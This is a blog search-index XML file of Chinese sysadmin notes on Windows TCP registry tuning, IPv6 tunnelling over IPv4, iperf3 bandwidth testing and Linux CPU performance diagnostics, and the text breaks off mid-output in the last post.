<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windowsws_TCP性能的描述]]></title>
    <url>%2F2022%2F05%2F04%2FWindowsws-TCP%E6%80%A7%E8%83%BD%E7%9A%84%E6%8F%8F%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[This article describes the TCP features in Windows. Applies to: Windows 10 – all editions, Windows Server 2012 R2 Original KB number: 224829 Summary This article describes the following TCP features in Windows: TCP window size（TCP窗口大小） TCP options now supported（现在支持的TCP选项） Windows scaling - RFC 1323（Windows 缩放-RFC1323） Timestamp - RFC 1323（时间戳-RFC1323） Protection against Wrapped Sequence Numbers (PAWS) （对包装序列号的保护PAWS） Selective Acknowledgments (SACKS) - RFC 2018 （选择性ACK（SACKS）-RFC2018） TCP retransmission behavior and fast retransmit (TCP重传行为及快速重传) The TCP features can be changed by changing the entries in the registry. 通过修改注册表可以改变TCP性能 Important The following sections, methods, or tasks contain steps that tell you how to modify the registry. However, serious problems might occur if you modify the registry incorrectly. Therefore, make sure that you follow these steps carefully. For added protection, back up the registry before you modify it. Then, you can restore the registry if a problem occurs. 以下各节、方法或是任务所包含的步骤将指导你怎么修改注册表。然而，如果你错误的修改注册表可能会导致各种问题。因此，你要确保仔细的遵守以下步骤。为了增加保护，你可以在修改他们之前备份注册表。如果当故障发生时，你可以还原注册表。 For more information about how to back up and restore the registry, click the following article number to view the article in the Microsoft Knowledge Base: 322756 How to back up and restore the registry in Windows 关于如何备份及还原注册表的更多信息，点击以下文章编号以学习在微软知识库中的内容：322756 How to back up and restore the registry in Windows TCP window sizeThe TCP receive window size is the amount of receive data (in bytes) that can be buffered during a connection. The sending host can send only that amount of data before it must wait for an acknowledgment and window update from the receiving host. The Windows TCP/IP stack is designed to self-tune itself in most environments, and uses larger default window sizes than earlier versions. TCP接收窗口大小是接收数据的数据量（以字节表示），它能在一个连接中进行缓存数据。发送主机在等待来自接收主机的ack和窗口更新信息之前，只能发送一定数量的数据。Windows TCP/IP协议栈被设计于在大多数环境下进行自我调整，并且使用了比早期版本较大的默认窗口大小。 Instead of using a hard-coded default receive window size, TCP adjusts to even increments of the maximum segment size (MSS). The MSS is negotiated during connection setup. Adjusting the receive window to even increments of the MSS increases the percentage百分比 of full-sized TCP segments used during bulk data transmissions. 不再使用硬编码默认的接收窗口大小，TCP调整到最大段长（MSS）的整数倍。MSS是在连接建立的过程中协商的。在批量传输数据期间，通过增加MSS来调整接收窗口将提高全尺寸的TCP段的百分比。 The receive window size is determined in the following manner: 决定接收窗口的大小如下： The first connection request sent to a remote host advertises a receive window size of 16K (16,384 bytes). 第一个连接请求发送到了远端主机以通告一个16KB的接收窗口大小。 When the connection is established, the receive window size is rounded up to an even increment of the MSS. 当连接建立成功，接收窗口大小将四舍五入到MSS的整数倍。 The window size is adjusted to four times the MSS, to a maximum size of 64 K, unless the window scaling option (RFC 1323) is used. 除非windows 缩放选项（RFC1323）被使用，不然窗口大小将调整为MSS的4倍，最大大小为64KB。 Note See the “Windows scaling” section 查看windows scaling部分. For Ethernet connections, the window size will normally be set to 17,520 bytes (16K rounded up to twelve 1460-byte segments). The window size may reduce when a connection is established to a computer that supports extended TCP head options, such as Selective Acknowledgments (SACKS) and Timestamps. These two options increase the TCP header size to more than 20 bytes, which results in less room for data. 对于以太网连接，窗口大小通常设置为17520字节（16K（16384字节）四舍五入到12个1460字节的段长度）。当与支持扩展TCP头部选项（例如SACKS和时间戳被设置）的电脑建立完一个连接，窗口大小可能会降低。以下两个选项将突破TCP头部大小20字节的限制，这也将导致数据空间部分的减少。 In previous versions of Windows NT, the window size for an Ethernet connection was 8,760 bytes, or six 1460-byte segments. 在windowsNT之前的版本，对于一个以太网连接，窗口大小是8760字节，即6个1460字节个段长。 To set the receive window size to a specific value, add the TcpWindowSize value to the registry subkey specific to your version of Windows. To do so, follow these steps: 为了设置接收窗口大小到一个指定的数值，请在你指定的windows版本中添加TcpWindowSize值到注册表子键。要做到这点，请跟随以下步骤: 调整接收窗口 Select Start &gt; Run, type Regedit, and then select OK. Expand the registry subkey specific to your version of Windows: For Windows 2000, expand the following subkey: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces For Windows Server 2003, expand the following subkey: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters On the Edit menu, point to New, and then select DWORD Value. Type TcpWindowSize in the New Value box, and then press Enter Select Modify on the Edit menu. Type the desired window size in the Value data box. Note 12The valid range for window size is 0-0x3FFFC000 Hexadecimal.窗口大小的有效值范围是0-0x3FFFC000（1073725440字节=1023MB） This value isn’t present by default. When you add the TcpWindowSize value, it overrides the default window size algorithm discussed above.默认情况下，该值是不存在的。当添加TcpWindowSize值时，它将覆盖上面讨论的默认窗口大小算法。 Note 123TcpWindowSize can also be added to the Parameters key to set the window size globally for all interfaces.TcpWindowSize也可以被添加到Parameters键，以全局设置所有接口的窗口大小。 TCP options now supportedPreviously, TCP options were used primarily for negotiating maximum segment sizes. In Windows, TCP options are used for Window Scaling, Time Stamp, and Selective ACK. 在以前，TCP选项主要用于协商最大段长。在windows中，TCP选项被用于窗口缩放，时间戳和SACK。 There are two types of TCP options: 有以下两类TCP选项 A single octet TCP option, which is used to indicate a specific option kind. 一个字节数的TCP选项，被用于表示特定的选项类型 A multiple octet TCP option, which consists of an option kind, an option length and a series of option octets. 多个字节数的TCP选项，它包含了一个选项类型，一个选项长度和多种选项字节。 The following list shows each TCP option kind, length, name, and description. Kind: 0Length: 1Option: End of Option ListDescription: Used when padding is needed for the last TCP option. Kind: 1Length: 1Option: No OperationDescription: Used when padding is needed and more TCP options follow within the same packet. Kind: 2Length: 4Option: Maximum Segment SizeDescription: Indicates the maximum size for a TCP segment that can be sent across the network. Kind: 3Length: 3Option: Window Scale OptionDescription: Identifies the scaling factor to be used when using window sizes larger than 64k. Kind: 8Length: 10Option: Time Stamp OptionDescription: Used to help calculate the Round Trip Time (RTT) of packets transmitted. Kind: 4Length: 2Option: TCP SACK permittedDescription: Informs other hosts that Selective Acks are permitted. Kind: 5Length: VariesOption: TCP SACK OptionDescription: Used by hosts to identify whether out-of-order packets were received. Windows scalingFor more efficient use of high-bandwidth networks, a larger TCP window size may be used. The TCP window size field controls the flow of data and is limited to 2 bytes, or a window size of 65,535 bytes. 为了更有效地使用高带宽网络，可以使用更大的TCP窗口大小。TCP窗口大小字段控制数据流，被限制为2字节，或者窗口大小为65,535字节（2到65535字节）。 Since the size field can’t be expanded, a scaling factor is used. TCP window scale is an option used to increase the maximum window size from 65,535 bytes to 1 Gigabyte. 因为size字段不能被扩展，所以使用了一个缩放因子。TCP窗口缩放是一个选项，用于将最大窗口大小从65,535字节增加到1G字节。 The window scale option is used only during the TCP three-way handshake. The window scale value represents the number of bits to left-shift the 16-bit window size field. The window scale value can be set from 0 (no shift) to 14. 窗口缩放选项仅在TCP三向握手期间使用。窗口缩放值表示左移16位窗口大小字段的位数。窗口缩放值可以从0(不移位)到设置为14。 To calculate the true window size, multiply the window size by 2^S where S is the scale value. 要计算真正的窗口大小，将窗口大小乘以2^S，其中S是缩放值。 For Example: If the window size is 65,535 bytes with a window scale factor of 3.True window size = 65535*2^3 True window size = 524280 例如窗口大小是65535，窗口缩放因子是3，则真实窗口大小=65535*（2^3）=524280 The following Network Monitor trace shows how the window scale option is used: 下面的Network Monitor跟踪显示了如何使用窗口缩放选项: 123456789101112131415161718192021222324TCP: ....S., len:0, seq:725163-725163, ack:0, win:65535, src:1217 dst:139(NBT Session) TCP: Source Port = 0x04C1 TCP: Destination Port = NETBIOS Session Service TCP: Sequence Number = 725163 (0xB10AB) TCP: Acknowledgement Number = 0 (0x0) TCP: Data Offset = 44 (0x2C) TCP: Reserved = 0 (0x0000) + TCP: Flags = 0x02 : ....S. TCP: Window = 65535 (0xFFFF) TCP: Checksum = 0x8565 TCP: Urgent Pointer = 0 (0x0) TCP: Options + TCP: Maximum Segment Size Option TCP: Option Nop = 1 (0x1) TCP: Window Scale Option TCP: Option Type = Window Scale TCP: Option Length = 3 (0x3) TCP: Window Scale = 3 (0x3) TCP: Option Nop = 1 (0x1) TCP: Option Nop = 1 (0x1) + TCP: Timestamps Option TCP: Option Nop = 1 (0x1) TCP: Option Nop = 1 (0x1) + TCP: SACK Permitted Option The window size used in the actual three-way handshake isn’t the window size that’s scaled, per RFC 1323 section 2.2: 根据RFC1323的2.2节，实际上三次握手中使用的窗口大小不是缩放后的窗口大小 “The Window field in a SYN (for example, a [SYN] or [SYN,ACK]) segment itself is never scaled.” “SYN(例如，[SYN]或[SYN,ACK])段中的Window字段本身永远不会伸缩。” It means that the first data packet sent after the three-way handshake is the actual window size. If there’s a scaling factor, the initial window size of 65,535 bytes is always used. The window size is then multiplied by the scaling factor identified in the three-way handshake. The table below represents the scaling factor boundaries for various window sizes. 这意味着三次握手后发送的第一个数据包才是实际的窗口大小。如果存在缩放因子，则始终使用初始窗口大小65,535字节。然后将窗口大小乘以在三次握手中确定的缩放因子。以下表格表示了对于各类窗口大小的缩放因子边界。 Scale Factor Scale Value Initial Window Window Scaled 0 1 65535 or less 65535 or less 1 2 65535 131,070 2 4 65535 262,140 3 8 65535 524,280 4 16 65535 1,048,560 5 32 65535 2,097,120 6 64 65535 4,194,240 7 128 65535 8,388,480 8 256 65535 16,776,960 9 512 65535 33,553,920 10 1024 65535 67,107,840 11 2048 65535 134,215,680 12 4096 65535 268,431,360 13 8192 65535 536,862,720 14 16384 65535 1,073,725,440 For example: If the window size in the registry is entered as 269000000 (269M) in decimal, the scaling factor during the three-way handshake is 13. A scaling factor of 12 only allows a window size up to 268,431,360 bytes (268M). The initial window size in this example would be calculated as follows:65,535 bytes with a window scale factor of 13.True window size = 65535*2^13True window size = 536,862,720 When the value for window size is added to the registry, and its size is larger than the default value, Windows attempts to use a scale value that accommodates the new window size. 当窗口大小的值添加到注册表中，并且其大小大于默认值时，Windows将尝试使用一个容纳新窗口大小的缩放值。 调整窗口缩放及时间戳The Tcp1323Opts value in the following registry key can be added to control scaling windows and timestamp: 1HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Tcpip\Parameters On the toolbar, select Start &gt; Run, and then type Regedit to start the Registry Editor. In the Registry Editor, select Edit, point to New, and then select DWORD Value. In the New Value box, type Tcp1323Opts, press ENTER, and then on the Edit menu, select Modify. Note The valid range is 0, 1, 2 or 3 where:0 (disable RFC 1323 options) 关闭RFC1323选项1 (window scale enabled only) 仅开启窗口scale2 (timestamps enabled only)仅开启时间戳3 (both options enabled)开启所有选项 This registry entry controls RFC 1323 timestamps and window scaling options. Timestamps and Window scaling are enabled by default, but can be manipulated with flag bits. Bit 0 controls window scaling. Bit 1 controls timestamps. 这个注册表项控制RFC 1323时间戳和窗口缩放选项。时间戳和窗口缩放在默认情况下是启用的，但可以通过标志位进行操作。第0位控制窗口缩放。第1位控制时间戳。 Selective Acknowledgments (SACKs)Windows introduces support for a performance feature known as Selective Acknowledgment, or SACK. SACK is especially important for connections that use large TCP window sizes. Before SACK, a receiver could only acknowledge the latest sequence number of a contiguous data stream that had been received, or the “left edge” of the receive window. With SACK enabled, the receiver continues to use the ACK number to acknowledge the left edge of the receive window, but it can also acknowledge other blocks of received data individually. SACK uses TCP header options, as shown below. Windows引入了对一种性能特性的支持，称为选择性承认(Selective Acknowledgment, SACK)。SACK对于使用大TCP窗口的连接尤其重要。在SACK之前，接收方只能确认已接收到的连续数据流的最新序列号或接收窗口的“左边缘”。启用SACK后，接收方继续使用ACK号来确认接收窗口的左边缘，但它也可以单独确认接收到的其他数据块。SACK使用TCP头选项，如下所示。 SACK uses two types of TCP Options.SACK使用了两种TCP选项的类型 The TCP Sack-Permitted Option is used only in a SYN packet (during the TCP connection establishment) to indicate that it can do selective ACK. TCP Sack-Permitted选项仅在SYN包中使用(在TCP连接建立过程中)，用来指示它可以进行选择性ACK。 The second TCP option, TCP Sack Option, contains acknowledgment for one or more blocks of data. The data blocks are identified using the sequence number at the start and at the end of that block of data. It’s also known as the left and right edge of the block of data. 第二个TCP选项，TCP Sack选项，包含对一个或多个数据块的确认。在数据块的开始和结束处使用序列号标识数据块。它也被称为数据块的左边缘和右边缘。 Kind 4 is TCP Sack-Permitted Option. Kind 5 is TCP Sack Option. Length is the length in bytes of this TCP option. Tcp SACK Permitted: Kind = 4 Length = 2 1 byte 1 byte Tcp SACK Option: Kind = 5 Length = Variable 1 byte Left edge of first block to Right edge of first block … Left edge of Nth block to Right edge of Nth block With SACK enabled (default), a packet or series of packets can be dropped. The receiver informs the sender which data has been received, and where there may be “holes” in the data. The sender can then selectively retransmit the missing data without a retransmission of blocks of data that have already been received successfully. SACK is controlled by the SackOpts registry parameter. 启用SACK(默认开启)后，可以丢弃一个或一系列数据包。接收方通知发送方已接收到哪些数据，以及数据中的哪些地方可能存在“漏洞”。然后，发送方可以有选择地重新传输丢失的数据，而无需重新传输已经成功接收到的数据块。SACK由SackOpts注册表参数控制。 调整SACK的支持The SackOpts value in the following registry key can be edited to control the use of selective acknowledgments: 1HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters On the toolbar, select Start &gt; Run, and then type Regedit to start the Registry Editor. Locate and select the above key in the Registry Editor, and then select Modify on the Edit menu. Type the desired value in the Value data box. Note The valid binary value is 0 or 1, the default value is 1. This parameter controls whether or not Selective ACK (SACK - RFC 2018) support is enabled. 二进制有效值为0或1，默认值为1。该参数用于控制是否启用对SACK - RFC 2018的支持。 TCP retransmission behavior and fast retransmitTCP retransmissionAs a review of normal retransmission behavior, TCP starts a retransmission timer when each outbound segment is handed down to the Internet Protocol (IP). If no acknowledgment has been received for the data in a given segment before the timer expires, then the segment is retransmitted. The retransmission timeout (RTO) is adjusted continuously to match the characteristics of the connection using Smoothed Round Trip Time (SRTT) calculations as described in RFC 793. The timer for a given segment is doubled after each retransmission of that segment. Using this algorithm, TCP tunes itself to the normal delay of a connection. Fast retransmitTCP retransmits data before the retransmission timer expires under some circumstances. The most common cause is a feature known as fast retransmit. When a receiver that supports fast retransmit receives data with a sequence number beyond the current expected one, some data was likely dropped. To help inform the sender of this event, the receiver immediately sends an ACK, with the ACK number set to the sequence number that it was expecting. It will continue to do so for each additional TCP segment that arrives. When the sender starts to receive a stream of ACKs that’s acknowledging the same sequence number, a segment may have been dropped. The sender will immediately resend the segment that the receiver is expecting, without waiting for the retransmission timer to expire. This optimization greatly improves performance when packets are frequently dropped. By default, Windows resends a segment under the following conditions: It receives three ACKs for the same sequence number: one ACK and two duplicates. 对于同一个序列号，它会收到三个ACK:一个ACK，两个duplicate。 The sequence number lags the current one. This behavior is controllable with the TcpMaxDupAcks registry parameter. 这种行为可以通过TcpMaxDupAcks注册表参数来控制。 启动快速重传所需的ack数量The TcpMaxDupAcks value in the following registry key can be edited to control the number of ACKs necessary to start a fast retransmits: 可以编辑以下注册表项中的TcpMaxDupAcks值，以控制启动快速重传所需的ack数量: 1HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters On the toolbar, select Start &gt; Run, and then type Regedit to start the Registry Editor. Locate and select the above key in the Registry Editor, and then select Modify on the Edit menu. Type the desired value in the Value data box. Note The valid range is 1-3, the default value is 2. 取值范围为1 ~ 3，缺省值为2。 This parameter determines the number of duplicate ACKs that must be received for the same sequence number of sent data before fast retransmit is triggered to resend the segment that has been dropped in transit. 该参数决定了在快速重传被丢弃的报文段之前，必须接收到与已发送数据序列相同的ack的个数。]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于ipv4隧道传输ipv6流量]]></title>
    <url>%2F2022%2F04%2F21%2F%E5%9F%BA%E4%BA%8Eipv4%E9%9A%A7%E9%81%93%E4%BC%A0%E8%BE%93ipv6%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[1.获取IPv6首先前往下面这个网站注册一个账户： https://www.tunnelbroker.net 注册完账户之后，点击左侧的 Create Regular Tunnel，如下所示 在下面的页面中，在对应的地方输入VPS的IP地址。然后选择一个服务器，注意选离vps所在机房最近的服务器。选好之后，在页面最下方点击 Create，进入下一个页面。 下一个页面如下所示。我们切换到 Example Configurations，然后选择 Linux-net-tools（如果是 Ubuntu 系统，选择 Debian/Ubuntu）。会出现几行代码。我们先不要关闭这个页面。 2.VPS配置IPv6通过SSH登录VPS之后，复制上面的代码，全部运行。至此应该已经成功了，我们可以顺便测试一下。可以运行 ping6 google.com，测试是否能 ping 通，如果能 ping 通，说明一切正常了，我们已经可以使用 IPv6 了。 需要注意的是，这个是将ipv6的数据封装在了ipv4报头中，通过ipv4隧道传输数据到目的节点。目的节点再解封ipv4报文转发ipv6数据。同时ipv4隧道中可能会有其他流量来消耗你的带宽。 3.设置开机自启下面我们设置 IPv6 开机启动。新建文件： 1vim /root/ipv6.sh 按一下 i 进行插入，输入如下内容： 1234567#!/bin/bashifconfig sit0 upifconfig sit0 inet6 tunnel ::YOUR-IPV4ifconfig sit1 upifconfig sit1 inet6 add YOUR-IPV6route -A inet6 add ::/0 dev sit1 上面的代码记得替换成你自己的 IPv4 和 IPv6 地址，其实就是把之前页面显示的代码抄过来，前面加上一行 #!/bin/bash 即可。 按一下 Esc 键，然后输入 :wq 保存并退出。 给文件增加可执行权限： 1chmod +x /root/ipv6.sh 然后编辑下面的文件： 1vim /etc/rc.d/rc.local 在最下方加入下面一行代码： 1sh /root/ipv6.sh 保存并退出，这样重启后也有 IPv6。]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[iperf测速使用与说明]]></title>
    <url>%2F2021%2F09%2F14%2Fiperf%E6%B5%8B%E9%80%9F%E4%BD%BF%E7%94%A8%E4%B8%8E%E8%AF%B4%E6%98%8E%2F</url>
    <content type="text"><![CDATA[1.概述Iperf3 是一个网络性能测试工具。Iperf可以测试最大TCP和UDP带宽性能，具有多种参数和UDP特性，可以根据需要调整，可以报告带宽、延迟抖动和数据包丢失.对于每个测试，它都会报告带宽，丢包和其他参数，可在Windows、Mac OS X、Linux、FreeBSD等各种平台使用，是一个简单又实用的小工具。 软件下载地址： https://iperf.fr/iperf-download.php 2.linux/windows安装12345678在CentOS 7上使用下列命令即可安装：# yum install iperf3 在ubuntu 上使用下列命令安装:# apt-get install iperf3 windows端安装：下载解压安装包，进入dos切换到iperf3解压目录，执行iperf3即可运行. 3.Iperf3使用Iperf3也是C/S(客户端/服务器端)架构模式，在使用iperf3测试时，要同时在server端与client端都各执行一个程序，让它们互相传送报文进行测试。 linux作为服务器： 12#开启iperf作为服务器，默认监听5201端口，所以需要防火墙放行该端口saneri@saneri-VirtualBox:~$ iperf3 -s windows作为客户端： 12#进入到程序解压目录，执行下述命令，其中192.168.1.1是服务器的IPC:\Users\iperf3&gt;iperf3.exe -c 192.168.1.1 缺省参数下，Client将连接Server端的5201端口，持续向Server端发送数据，并统计出每秒传输的字节数、带宽、出现报文重传的次数、拥塞窗口（Congestion Window）大小，整个测试将持续10秒钟；最后将汇总10秒的平均数据，并给出发送和接收端的统计。 iperf3 所提供的选项非常多，以下介绍一些常用的参数。 服务器端命令行 其中： 123-s 表示服务器端；-p 定义端口号；-i 设置每次报告之间的时间间隔，单位为秒，如果设置为非零值，就会按照此时间间隔输出测试报告，默认值为零 客户端命令行 其中： 12345678910111213141516-c 表示服务器的IP地址；-p 表示服务器的端口号；-t 参数可以指定传输测试的持续时间,Iperf在指定的时间内，重复的发送指定长度的数据包，默认是10秒钟.-i 设置每次报告之间的时间间隔，单位为秒，如果设置为非零值，就会按照此时间间隔输出测试报告，默认值为零；-w 设置套接字缓冲区为指定大小，对于TCP方式，此设置为TCP窗口大小，对于UDP方式，此设置为接受UDP数据包的缓冲区大小，限制可以接受数据包的最大值.-b 测试速率，如100Mbps。写法为-b 100M-P 设置发起的线程连接数目。如-P 5表示同时发起5个连接测速-u 测试udp带宽--logfile 参数可以将输出的测试结果储存至文件中.-J 来输出JSON格式测试结果.-R 反向传输,缺省iperf3使用上传模式：Client负责发送数据，Server负责接收；如果需要测试下载速度，则在Client侧使用-R参数即可.]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CPU性能排查笔记]]></title>
    <url>%2F2021%2F03%2F22%2FCPU%E6%80%A7%E8%83%BD%E6%8E%92%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[1.平均负载平均负载load average：是单位时间内的平均活跃进程数，它和 CPU 使用率并没有直接关系 活跃进程数：系统处于可运行状态和不可中断状态的进程数 可运行状态进程：正在使用 CPU 或者正在等待 CPU的进程 不可中断状态的进程：正处于内核态关键流程中的进程，并且这些流程是不可打断的，比如最常见的是等待硬件设备的 I/O 响应 1234[root@ecs-M79hl ~]# uptime 21:39:02 up 30 days, 9:30, 1 user, load average: 0.05, 0.09, 0.04或[root@ecs-M79hl ~]# watch -d uptime 1.1 平均负载与CPU使用率的区别CPU使用率高，平均负载就会高；平均负载高不一定就表示CPU使用率高。因为影响平均负载的除了可运行状态进程，还有不可中断状态的进程。 1.2 命令1.2.1 查看CPU核数平均负载最理想的情况是等于 CPU 个数，当平均负载比 CPU 个数还大的时候，系统已经出现了过载。 1grep 'model name' /proc/cpuinfo | wc -l2 当平均负载高于 CPU 数量 70% 的时候，就应该分析排查负载高的问题了。一旦负载过高，就可能导致进程响应变慢，进而影响服务的正常功能。 1.2.2 mpstat查看整体CPU使用率变化情况mpstat可以查看CPU使用率情况，其中-P ALL 表示监控所有CPU，后面数字5表示间隔5秒后输出一组数据 12345678910[root@ecs-u4x ~]# mpstat -P ALL 5Linux 5.4.11-1.el7.elrepo.x86_64 (ecs-u4x) 03/22/2021 _x86_64_ (1 CPU)09:48:23 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle09:48:28 PM all 0.00 0.00 0.00 0.00 0.00 0.00 0.20 0.00 0.00 99.8009:48:28 PM 0 0.00 0.00 0.00 0.00 0.00 0.00 0.20 0.00 0.00 99.8009:48:28 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle09:48:33 PM all 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.0009:48:33 PM 0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 100.00 user（通常缩写为 us），代表用户态 CPU 时间。注意，它不包括下面的 nice 时间，但包括了 guest 时间。 nice（通常缩写为 ni），代表低优先级用户态 CPU 时间，也就是进程的 nice 值被调整为 1-19 之间时的 CPU 时间。这里注意，nice 可取值范围是 -20 到 19，数值越大，优先级反而越低。 system（通常缩写为 sys），代表内核态 CPU 时间。 idle（通常缩写为 id），代表空闲时间。注意，它不包括等待 I/O 的时间（iowait）。 iowait（通常缩写为 wa），代表等待 I/O 的 CPU 时间。 irq（通常缩写为 hi），代表处理硬中断的 CPU 时间。 softirq（通常缩写为 si），代表处理软中断的 CPU 时间。 steal（通常缩写为 st），代表当系统运行在虚拟机中的时候，被其他虚拟机占用的 CPU 时间。 guest（通常缩写为 guest），代表通过虚拟化运行其他操作系统的时间，也就是运行虚拟机的 CPU 时间。 guest_nice（通常缩写为 gnice），代表以低优先级运行虚拟机的时间。 1.2.3 pidstat查看具体进程的CPU使用率情况pidstat -u 5 1表示间隔5秒后输出一组数据 123456789101112[root@ecs-u4x ~]# pidstat -u 5 1Linux 5.4.11-1.el7.elrepo.x86_64 (ecs-u4x) 03/22/2021 _x86_64_ (1 CPU)09:51:48 PM UID PID %usr %system %guest %CPU CPU Command09:51:53 PM 0 3498 0.20 0.00 0.00 0.20 0 tuned09:51:53 PM 0 28812 0.00 0.20 0.00 0.20 0 kworker/0:2-events_power_efficient09:51:53 PM 0 30799 0.00 0.20 0.00 0.20 0 pidstatAverage: UID PID %usr %system %guest %CPU CPU CommandAverage: 0 3498 0.20 0.00 0.00 0.20 - tunedAverage: 0 28812 0.00 0.20 0.00 0.20 - kworker/0:2-events_power_efficientAverage: 0 30799 0.00 0.20 0.00 0.20 - pidstat 2.CPU上下文切换根据任务的不同，CPU 的上下文切换就可以分为进程上下文切换、线程上下文切换以及中断上下文切换。 如果系统的上下文切换次数比较稳定，那么从数百到一万以内，都应该算是正常的。但当上下文切换次数超过一万次，或者切换次数出现数量级的增长时，就很可能已经出现了性能问题。 2.1 命令2.1.1 vmstat查看整体CPU的上下文切换情况vmstat 是一个常用的系统性能分析工具，主要用来分析系统的内存使用情况，也常用来分析 CPU 上下文切换和中断的次数。vmstat 只给出了系统总体的上下文切换情况，要想查看每个进程的详细情况，就需要使用我们前面提到过的 pidstat 。 vmstat 5表示每5秒输出一组数据 12345[root@ecs-u4x ~]# vmstat 5procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 2 0 0 17808 24 330528 0 0 0 4 12 17 1 1 97 0 1 0 0 0 16816 24 330552 0 0 0 0 113 284 3 4 89 0 4 cs（context switch）是每秒上下文切换的次数。 in（interrupt）则是每秒中断的次数。 r（Running or Runnable）是就绪队列的长度，也就是正在运行和等待 CPU 的进程数。 b（Blocked）则是处于不可中断睡眠状态的进程数。 2.1.2 pidstat查看每个进程上下文切换pidstat -w -u 1表示每隔1秒输出1组数据，-w参数表示输出进程切换指标，而-u参数则表示输出CPU使用指标 12345678910111213[root@ecs-u4x ~]# pidstat -w -u 1Linux 5.4.11-1.el7.elrepo.x86_64 (ecs-u4x) 03/22/2021 _x86_64_ (1 CPU)10:22:57 PM UID PID %usr %system %guest %CPU CPU Command10:22:58 PM 0 5016 0.00 1.00 0.00 1.00 0 pidstat10:22:57 PM UID PID cswch/s nvcswch/s Command10:22:58 PM 0 9 2.00 0.00 ksoftirqd/010:22:58 PM 0 10 4.00 0.00 rcu_sched10:22:58 PM 0 1544 20.00 0.00 xfsaild/dm-010:22:58 PM 0 1702 13.00 0.00 kworker/0:0-events_power_efficient10:22:58 PM 0 4988 1.00 0.00 sshd10:22:58 PM 0 5016 1.00 0.00 pidstat10:22:58 PM 0 20461 1.00 0.00 kworker/u2:0-events_unbound cswch ：表示每秒自愿上下文切换（voluntary context switches）的次数，自愿上下文切换是指进程无法获取所需资源，导致的上下文切换。如 I/O、内存等系统资源不足时，就会发生自愿上下文切换。 nvcswch：表示每秒非自愿上下文切换（non voluntary context switches）的次数。非自愿上下文切换，则是指进程由于时间片已到等原因，被系统强制调度，进而发生的上下文切换。如大量进程都在争抢 CPU 时，就容易发生非自愿上下文切换。 自愿上下文切换变多了，说明进程都在等待资源，有可能发生了 I/O 等其他问题；非自愿上下文切换变多了，说明进程都在被强制调度，也就是都在争抢 CPU，说明 CPU 的确成了瓶颈 2.1.3 pidstat查看线程上下文切换 pidstat -wt 1表示每隔1秒输出一组数据，-wt 参数表示输出线程的上下文切换指标 123456789101112131415161718192021222324252627[root@ecs-u4x ~]# pidstat -wt 1Linux 5.4.11-1.el7.elrepo.x86_64 (ecs-u4x) 03/22/2021 _x86_64_ (1 CPU)10:26:58 PM UID TGID TID cswch/s nvcswch/s Command10:26:59 PM 0 9 - 4.95 0.00 ksoftirqd/010:26:59 PM 0 - 9 4.95 0.00 |__ksoftirqd/010:26:59 PM 0 10 - 10.89 0.00 rcu_sched10:26:59 PM 0 - 10 10.89 0.00 |__rcu_sched10:26:59 PM 0 16 - 0.99 0.00 kauditd10:26:59 PM 0 - 16 0.99 0.00 |__kauditd10:26:59 PM 0 1544 - 19.80 0.00 xfsaild/dm-010:26:59 PM 0 - 1544 19.80 0.00 |__xfsaild/dm-010:26:59 PM 0 1613 - 0.99 0.00 systemd-journal10:26:59 PM 0 - 1613 0.99 0.00 |__systemd-journal10:26:59 PM 0 2621 - 0.99 0.00 auditd10:26:59 PM 0 - 2621 0.99 0.00 |__auditd10:26:59 PM 0 - 3718 0.99 0.00 |__tuned10:26:59 PM 0 - 3511 1.98 0.00 |__in:imjournal10:26:59 PM 0 - 3512 0.99 0.00 |__rs:main Q:Reg10:26:59 PM 0 5624 - 10.89 0.00 kworker/0:2-events10:26:59 PM 0 - 5624 10.89 0.00 |__kworker/0:2-events10:26:59 PM 0 5672 - 1.98 2.97 sshd10:26:59 PM 0 - 5672 1.98 2.97 |__sshd10:26:59 PM 74 5673 - 4.95 0.00 sshd10:26:59 PM 74 - 5673 4.95 0.00 |__sshd10:26:59 PM 0 5691 - 0.99 0.99 pidstat10:26:59 PM 0 - 5691 0.99 0.99 |__pidstat 2.1.4 查看中断次数/proc/interrupts 提供了一个只读的中断使用情况。中断次数变多了，说明 CPU 被中断处理程序占用，还需要通过查看 /proc/interrupts 文件来分析具体的中断类型。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[root@ecs-u4x ~]# watch -d cat /proc/interrupts CPU0 1: 9 IO-APIC 1-edge i8042 6: 3 IO-APIC 6-edge floppy 8: 0 IO-APIC 8-edge rtc0 9: 0 IO-APIC 9-fasteoi acpi 10: 233149 IO-APIC 10-fasteoi virtio6 11: 35 IO-APIC 11-fasteoi uhci_hcd:usb1 12: 15 IO-APIC 12-edge i8042 14: 0 IO-APIC 14-edge ata_piix 15: 0 IO-APIC 15-edge ata_piix 24: 0 PCI-MSI 49152-edge virtio0-config 25: 10886181 PCI-MSI 49153-edge virtio0-input.0 26: 12166434 PCI-MSI 49154-edge virtio0-output.0 27: 0 PCI-MSI 65536-edge virtio1-config 28: 0 PCI-MSI 65537-edge virtio1-input.0 29: 123 PCI-MSI 65538-edge virtio1-output.0 30: 0 PCI-MSI 98304-edge virtio3-config 31: 26 PCI-MSI 98305-edge virtio3-virtqueues 32: 0 PCI-MSI 114688-edge virtio4-config 33: 1067884 PCI-MSI 114689-edge virtio4-req.0 34: 0 